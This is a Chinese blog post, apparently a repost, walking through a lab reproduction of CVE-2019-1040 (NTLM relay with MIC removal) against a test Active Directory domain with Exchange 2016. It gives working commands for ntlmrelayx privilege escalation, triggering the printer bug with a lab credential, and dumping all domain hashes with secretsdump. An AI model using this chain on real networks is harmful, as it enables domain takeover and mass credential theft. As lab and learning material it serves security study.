# CVE-2019-1040 - mrhonest - 博客园

> 原文：[`www.cnblogs.com/mrhonest/p/14187849.html`](https://www.cnblogs.com/mrhonest/p/14187849.html)

# 漏洞概述

[`daiker.gitbook.io/windows-protocol/ntlm-pian/7#5-cve-2019-1040`](https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#5-cve-2019-1040)

# 环境

| 角色 | 系统 | 计算机名 | 地址 | 域 |
| --- | --- | --- | --- | --- |
| 攻击机 | kali |  | 192.168.1.103 |  |
| 域控 | windows2012R2 | sync-dc | 192.168.110.12 | sync.net |
| exchange2016 | windows2016 | sync-ex2016 | 192.168.110.81 | sync.net |

# 利用条件

*   在域内
    或者
*   已知一个域用户的帐号或 ntlm-hash

# 操作

## 攻击机开启中继

```
impacket-ntlmrelayx --escalate-user chenli -t ldap://192.168.110.12 -smb2support --remove-mic --delegate-access -debug 
```

> chenli 要提升权限的用户名

![](img/329c784ee6d09bff51e6fb68a7d808d4.png)

## 使用打印机 bug

*   windows 下

```
spoolsample.exe	exchangeIP 攻击机 IP 
```

![](img/19b62c12aaba2139f39ed38b61ee9df9.png)

*   kali 下

```
python3 printerbug.py sync.net/chenli:cl123\!\@\#45@192.168.110.81 192.168.1.103 
```

![](img/84996b429466ba7f53fa7a27efd779bf.png)

*   中继"提权"中
    ![](img/11448bc4c280165c8355c8c44795598a.png)

## dumpHASH

*   windows 下

```
secretsdump.exe sync.net/chenli@sync-dc -just-dc 
```

![](img/879c8ec3e9a4032c6417acdd34923f49.png)

*   kali 下

```
impacket-secretsdump -just-dc sync.net/chenli@192.168.110.12 
```

![](img/9bc8bc11692c717deec84fa8bd887755.png)